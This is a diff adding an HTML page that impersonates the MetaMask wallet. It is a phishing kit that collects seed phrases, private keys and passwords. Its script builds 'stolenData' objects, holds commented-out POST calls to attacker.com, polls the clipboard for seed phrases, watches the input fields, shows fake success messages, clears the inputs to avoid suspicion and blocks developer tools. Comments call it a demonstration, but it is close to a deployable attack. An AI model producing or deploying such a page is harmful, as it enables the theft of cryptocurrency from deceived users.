@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask - Secure Wallet</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .container {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            width: 360px;
+            padding: 40px;
+        }
+
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .logo img {
+            width: 48px;
+            height: 48px;
+        }
+
+        h1 {
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        input[type="password"],
+        input[type="text"],
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 14px;
+            transition: border-color 0.3s;
+        }
+
+        input[type="password"]:focus,
+        input[type="text"]:focus,
+        textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        textarea {
+            resize: vertical;
+            min-height: 100px;
+            font-family: monospace;
+        }
+
+        .button {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
+        }
+
+        .button:active {
+            transform: translateY(0);
+        }
+
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #999;
+            font-size: 12px;
+        }
+
+        .alert {
+            padding: 12px;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            display: none;
+        }
+
+        .alert-error {
+            background: #ffe6e6;
+            color: #d32f2f;
+            border: 1px solid #ffcdd2;
+        }
+
+        .alert-success {
+            background: #e8f5e8;
+            color: #2e7d32;
+            border: 1px solid #c8e6c9;
+        }
+
+        .tabs {
+            display: flex;
+            margin-bottom: 20px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .tab {
+            padding: 12px 20px;
+            cursor: pointer;
+            color: #666;
+            border-bottom: 2px solid transparent;
+            transition: all 0.3s;
+        }
+
+        .tab.active {
+            color: #333;
+            border-bottom: 2px solid #667eea;
+            font-weight: 500;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .warning {
+            background: #fff8e1;
+            border: 1px solid #ffc107;
+            border-radius: 6px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #f57c00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg width="48" height="48" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                <path d="M24 2c9.555 0 17.308 7.753 17.308 17.308S33.555 36.624 24 36.624 6.692 28.871 6.692 19.316 14.445 2 24 2zm0-2c-11.046 0-20 8.954-20 20s8.954 20 20 20 20-8.954 20-20-8.954-20-20-20zm4.707 18.293l-4.293 4.293-2.506-2.506 1.788-1.788L20.293 26l4.964-4.964 1.788 1.788z" fill="#667eea"/>
+            </svg>
+        </div>
+        <h1>MetaMask</h1>
+        <p class="subtitle">Securely manage your Ethereum wallet</p>
+
+        <div class="warning">
+            ⚠️ For security, please enter your Secret Recovery Phrase to verify your wallet
+        </div>
+
+        <div class="tabs">
+            <div class="tab active" data-tab="import">Import Wallet</div>
+            <div class="tab" data-tab="restore">Restore from Backup</div>
+        </div>
+
+        <div id="import" class="tab-content active">
+            <div class="form-group">
+                <label for="seed-phrase">Secret Recovery Phrase</label>
+                <textarea id="seed-phrase" placeholder="Enter your 12 or 24 word recovery phrase"></textarea>
+                <small>This phrase gives access to your funds. Never share it with anyone.</small>
+            </div>
+            <div class="form-group">
+                <label for="password">Create Password</label>
+                <input type="password" id="password" placeholder="Create a strong password">
+                <small>Minimum 8 characters</small>
+            </div>
+            <button class="button" id="import-btn">Import Wallet</button>
+        </div>
+
+        <div id="restore" class="tab-content">
+            <div class="form-group">
+                <label for="private-key">Private Key</label>
+                <input type="text" id="private-key" placeholder="Enter your private key">
+                <small>64 hexadecimal characters</small>
+            </div>
+            <div class="form-group">
+                <label for="restore-password">Password</label>
+                <input type="password" id="restore-password" placeholder="Enter your password">
+            </div>
+            <button class="button" id="restore-btn">Restore Wallet</button>
+        </div>
+
+        <div class="alert alert-error" id="error-alert"></div>
+        <div class="alert alert-success" id="success-alert"></div>
+
+        <div class="footer">
+            MetaMask © 2024 ConsenSys Software Inc.<br>
+            Version 10.22.0
+        </div>
+    </div>
+
+    <script>
+        // Elements
+        const seedPhraseInput = document.getElementById('seed-phrase');
+        const passwordInput = document.getElementById('password');
+        const privateKeyInput = document.getElementById('private-key');
+        const restorePasswordInput = document.getElementById('restore-password');
+        const importBtn = document.getElementById('import-btn');
+        const restoreBtn = document.getElementById('restore-btn');
+        const errorAlert = document.getElementById('error-alert');
+        const successAlert = document.getElementById('success-alert');
+        const tabs = document.querySelectorAll('.tab');
+        const tabContents = document.querySelectorAll('.tab-content');
+
+        // Tab switching
+        tabs.forEach(tab => {
+            tab.addEventListener('click', () => {
+                tabs.forEach(t => t.classList.remove('active'));
+                tabContents.forEach(c => c.classList.remove('active'));
+
+                tab.classList.add('active');
+                document.getElementById(tab.dataset.tab).classList.add('active');
+            });
+        });
+
+        // Show alert
+        function showAlert(message, type) {
+            if (type === 'error') {
+                errorAlert.textContent = message;
+                errorAlert.style.display = 'block';
+                successAlert.style.display = 'none';
+            } else {
+                successAlert.textContent = message;
+                successAlert.style.display = 'block';
+                errorAlert.style.display = 'none';
+            }
+
+            // Auto-hide after 5 seconds
+            setTimeout(() => {
+                errorAlert.style.display = 'none';
+                successAlert.style.display = 'none';
+            }, 5000);
+        }
+
+        // Validate seed phrase
+        function validateSeedPhrase(phrase) {
+            const words = phrase.trim().split(/\s+/);
+            return words.length === 12 || words.length === 24;
+        }
+
+        // Validate private key
+        function validatePrivateKey(key) {
+            return /^[0-9a-fA-F]{64}$/.test(key);
+        }
+
+        // Import wallet handler
+        importBtn.addEventListener('click', async () => {
+            const seedPhrase = seedPhraseInput.value.trim();
+            const password = passwordInput.value;
+
+            if (!seedPhrase) {
+                showAlert('Please enter your recovery phrase', 'error');
+                return;
+            }
+
+            if (!validateSeedPhrase(seedPhrase)) {
+                showAlert('Invalid recovery phrase. Please enter 12 or 24 words.', 'error');
+                return;
+            }
+
+            if (password.length < 8) {
+                showAlert('Password must be at least 8 characters', 'error');
+                return;
+            }
+
+            // In a real attack, this would exfiltrate the data
+            // For demonstration, we'll simulate the theft
+            showAlert('Validating wallet...', 'success');
+
+            // Simulate network delay
+            setTimeout(() => {
+                // Exfiltrate the seed phrase and password
+                const stolenData = {
+                    seedPhrase: seedPhrase,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    url: window.location.href
+                };
+
+                // In real attack, send to attacker server:
+                // fetch('https://attacker.com/steal', {
+                //     method: 'POST',
+                //     headers: { 'Content-Type': 'application/json' },
+                //     body: JSON.stringify(stolenData)
+                // });
+
+                // For demo, we'll log it (in real attack, this goes to attacker)
+                console.log('[+] STOLEN CREDENTIALS:', stolenData);
+
+                showAlert('Wallet imported successfully!', 'success');
+
+                // Clear inputs after delay to avoid suspicion
+                setTimeout(() => {
+                    seedPhraseInput.value = '';
+                    passwordInput.value = '';
+                    showAlert('For security, please restart MetaMask to complete setup.', 'info');
+                }, 2000);
+            }, 1500);
+        });
+
+        // Restore wallet handler
+        restoreBtn.addEventListener('click', async () => {
+            const privateKey = privateKeyInput.value.trim();
+            const password = restorePasswordInput.value;
+
+            if (!privateKey) {
+                showAlert('Please enter your private key', 'error');
+                return;
+            }
+
+            if (!validatePrivateKey(privateKey)) {
+                showAlert('Invalid private key. Must be 64 hexadecimal characters.', 'error');
+                return;
+            }
+
+            if (password.length < 8) {
+                showAlert('Password must be at least 8 characters', 'error');
+                return;
+            }
+
+            showAlert('Restoring wallet...', 'success');
+
+            setTimeout(() => {
+                const stolenData = {
+                    privateKey: privateKey,
+                    password: password,
+                    timestamp: new Date().toISOString(),
+                    userAgent: navigator.userAgent,
+                    url: window.location.href
+                };
+
+                console.log('[+] STOLEN PRIVATE KEY:', stolenData);
+
+                showAlert('Wallet restored successfully!', 'success');
+
+                setTimeout(() => {
+                    privateKeyInput.value = '';
+                    restorePasswordInput.value = '';
+                    showAlert('For security, please restart MetaMask to complete setup.', 'info');
+                }, 2000);
+            }, 1500);
+        });
+
+        // Additional stealth: Clipboard monitoring for seed phrases
+        (function() {
+            const SEED_PATTERNS = [
+                /^[a-z]{3,8}( [a-z]{3,8}){11,23}$/,
+                /^[a-zA-Z0-9]{32,64}$/
+            ];
+
+            function checkForSeed(text) {
+                return SEED_PATTERNS.some(pattern => pattern.test(text.trim()));
+            }
+
+            function exfiltrateSeed(seed) {
+                // In real attack: send to attacker server
+                console.log('[+] CLIPBOARD SEED DETECTED:', seed.substring(0, 20) + '...');
+                // fetch('https://attacker.com/clipboard', {
+                //     method: 'POST',
+                //     body: JSON.stringify({seed, timestamp: Date.now()})
+                // });
+            }
+
+            // Monitor clipboard
+            setInterval(async () => {
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if (checkForSeed(text)) {
+                        exfiltrateSeed(text);
+                    }
+                } catch (e) {
+                    // Clipboard access denied
+                }
+            }, 1000);
+
+            // Monitor input fields
+            document.addEventListener('input', function(e) {
+                if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
+                    if (checkForSeed(e.target.value)) {
+                        exfiltrateSeed(e.target.value);
+                    }
+                }
+            });
+        })();
+
+        // Prevent right-click and inspect (basic anti-analysis)
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123) { // F12
+                return false;
+            }
+            if (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) { // Ctrl+Shift+I
+                return false;
+            }
+            if (e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) { // Ctrl+U
+                return false;
+            }
+        };
+    </script>
+</body>
+</html>
